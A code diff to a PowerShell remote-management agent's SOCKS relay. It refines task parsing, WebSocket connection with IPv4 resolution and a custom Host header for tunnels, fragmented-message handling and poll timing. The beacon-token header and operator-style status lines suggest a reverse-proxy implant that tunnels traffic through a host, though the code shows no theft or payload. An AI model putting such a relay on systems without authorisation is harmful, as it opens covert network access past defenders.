@@ -661,8 +661,33 @@ function Get-RmmSocksTasksFromPoll {
     if ($obj -is [string]) {
         try { $obj = $obj | ConvertFrom-Json } catch { return @() }
     }
-    if (-not $obj.tasks) { return @() }
-    return @($obj.tasks)
+    $rawTasks = $null
+    if ($obj -is [hashtable]) {
+        if ($obj.ContainsKey('tasks')) { $rawTasks = $obj['tasks'] }
+    } elseif ($null -ne $obj) {
+        foreach ($p in $obj.PSObject.Properties) {
+            if ($p.Name -match '^(?i)tasks$') { $rawTasks = $p.Value; break }
+        }
+    }
+    if ($null -eq $rawTasks) { return @() }
+    $normalized = New-Object System.Collections.ArrayList
+    foreach ($t in @($rawTasks)) {
+        if ($null -eq $t) { continue }
+        if ($t -is [hashtable]) {
+            [void]$normalized.Add($t)
+        } else {
+            $portVal = 0
+            if ($null -ne $t.port) { $portVal = [int]$t.port }
+            [void]$normalized.Add(@{
+                op       = [string]$t.op
+                id       = [string]$t.id
+                host     = [string]$t.host
+                port     = $portVal
+                data_b64 = [string]$t.data_b64
+            })
+        }
+    }
+    return @($normalized)
 }
 
 function Test-RmmInternalCommand {
@@ -830,16 +855,22 @@ function Invoke-RmmSocksCycle {
     return $true
 }
 
-function Get-RmmSocksWsUri {
-    $base = $u.TrimEnd('/')
-    if ($base -match '(?i)^https://') {
-        $wsBase = 'wss://' + $base.Substring(8)
-    } elseif ($base -match '(?i)^http://') {
-        $wsBase = 'ws://' + $base.Substring(7)
-    } else {
-        $wsBase = "ws://$base"
+function Get-RmmSocksWsConnectInfo {
+    # Same IPv4 wire + Host header as Invoke-RmmRestMethod (required for many tunnels).
+    $httpUri = [Uri]"$($u.TrimEnd('/'))/socks?id=$sessionId"
+    $resolved = Resolve-RmmTunnelIpv4 -Uri $httpUri
+    $builder = New-Object System.UriBuilder $httpUri
+    if ($httpUri.Scheme -match '(?i)^https') { $builder.Scheme = 'wss' } else { $builder.Scheme = 'ws' }
+    $builder.Host = $resolved.Ipv4.ToString()
+    if ($builder.Port -lt 1) {
+        $builder.Port = if ($builder.Scheme -eq 'wss') { 443 } else { 80 }
     }
-    return "$wsBase/socks?id=$sessionId"
+    $builder.Path = '/socks'
+    $builder.Query = "id=$sessionId"
+    return @{
+        Uri        = $builder.Uri
+        HostHeader = $resolved.OriginalHost
+    }
 }
 
 function Send-RmmSocksWsJson {
@@ -865,36 +896,52 @@ function Receive-RmmSocksWsJson {
     )
     $buf = New-Object byte[] 262144
     $seg = [System.ArraySegment[byte]]::new($buf)
-    $cts = New-Object System.Threading.CancellationTokenSource
-    $cts.CancelAfter($TimeoutMs)
-    try {
-        $recv = $WebSocket.ReceiveAsync($seg, $cts.Token).GetAwaiter().GetResult()
-    } catch {
-        return $null
-    } finally {
-        $cts.Dispose()
+    $sb = New-Object System.Text.StringBuilder
+    $deadline = [DateTime]::UtcNow.AddMilliseconds($TimeoutMs)
+    while ([DateTime]::UtcNow -lt $deadline) {
+        $remainMs = [int][Math]::Max(1, ($deadline - [DateTime]::UtcNow).TotalMilliseconds)
+        $cts = New-Object System.Threading.CancellationTokenSource
+        $cts.CancelAfter($remainMs)
+        try {
+            $recv = $WebSocket.ReceiveAsync($seg, $cts.Token).GetAwaiter().GetResult()
+        } catch {
+            if ($sb.Length -gt 0) { break }
+            return $null
+        } finally {
+            $cts.Dispose()
+        }
+        if ($recv.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
+            return @{ op = 'close' }
+        }
+        [void]$sb.Append([System.Text.Encoding]::UTF8.GetString($buf, 0, $recv.Count))
+        if ($recv.EndOfMessage) {
+            try {
+                return ($sb.ToString() | ConvertFrom-Json)
+            } catch {
+                return $null
+            }
+        }
     }
-    if ($recv.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
-        return @{ op = 'close' }
+    if ($sb.Length -gt 0) {
+        try {
+            return ($sb.ToString() | ConvertFrom-Json)
+        } catch { }
     }
-    $text = [System.Text.Encoding]::UTF8.GetString($buf, 0, $recv.Count)
-    try {
-        return ($text | ConvertFrom-Json)
-    } catch {
-        return $null
-    }
+    return $null
 }
 
 function Connect-RmmSocksClientWebSocket {
-    param([Uri]$Uri)
+    $info = Get-RmmSocksWsConnectInfo
     $ws = [System.Net.WebSockets.ClientWebSocket]::new()
     if ($beaconSecret) {
         $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
     }
+    [void]$ws.Options.SetRequestHeader('Host', $info.HostHeader)
     $origin = $u.TrimEnd('/')
     if ($origin -match '(?i)^https?://') {
         $ws.Options.SetRequestHeader('Origin', $origin)
     }
+    Write-RmmLog "SOCKS WS connect $($info.Uri) Host=$($info.HostHeader)" -Level DEBUG
     $lastErr = $null
     foreach ($attempt in 1..5) {
         if ($attempt -gt 1) { Start-Sleep -Milliseconds 400 }
@@ -905,11 +952,12 @@ function Connect-RmmSocksClientWebSocket {
                 if ($beaconSecret) {
                     $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
                 }
+                [void]$ws.Options.SetRequestHeader('Host', $info.HostHeader)
                 if ($origin -match '(?i)^https?://') {
                     $ws.Options.SetRequestHeader('Origin', $origin)
                 }
             }
-            $null = $ws.ConnectAsync($Uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()
+            $null = $ws.ConnectAsync($info.Uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()
             return $ws
         } catch {
             $lastErr = $_
@@ -919,8 +967,7 @@ function Connect-RmmSocksClientWebSocket {
 }
 
 function Invoke-RmmSocksWsRelay {
-    $uri = [Uri](Get-RmmSocksWsUri)
-    $ws = Connect-RmmSocksClientWebSocket -Uri $uri
+    $ws = Connect-RmmSocksClientWebSocket
     Write-RmmSocksHostLine '[+] SOCKS WebSocket channel active (push tasks)'
     $headers = Get-RmmRequestHeaders
     $emptyPoll = @{ active = $true; tasks = @() }
@@ -973,8 +1020,11 @@ function Invoke-RmmSocksHttpRelay {
                 Write-RmmSocksHostLine '[+] SOCKS channel active (/socks HTTP poll)'
                 $script:RmmSocksChannelWasActive = $true
             }
-            $null = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
-            Start-Sleep -Milliseconds 80
+            $cycleOk = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
+            if ($cycleOk -eq $false) {
+                Write-RmmSocksHostLine '[!] SOCKS cycle failed (check beacon token / server)' -ForegroundColor Yellow
+            }
+            Start-Sleep -Milliseconds 25
         } catch {
             Write-RmmSocksHostLine "[!] SOCKS channel error: $($_.Exception.Message)"
             Start-Sleep -Milliseconds 400
@@ -997,7 +1047,7 @@ function Get-RmmSocksWorkerFunctionNames {
         'Get-RmmSocksTasksFromPoll',
         'Read-RmmSocksTcpChunk',
         'Invoke-RmmSocksCycle',
-        'Get-RmmSocksWsUri',
+        'Get-RmmSocksWsConnectInfo',
         'Connect-RmmSocksClientWebSocket',
         'Send-RmmSocksWsJson',
         'Receive-RmmSocksWsJson',
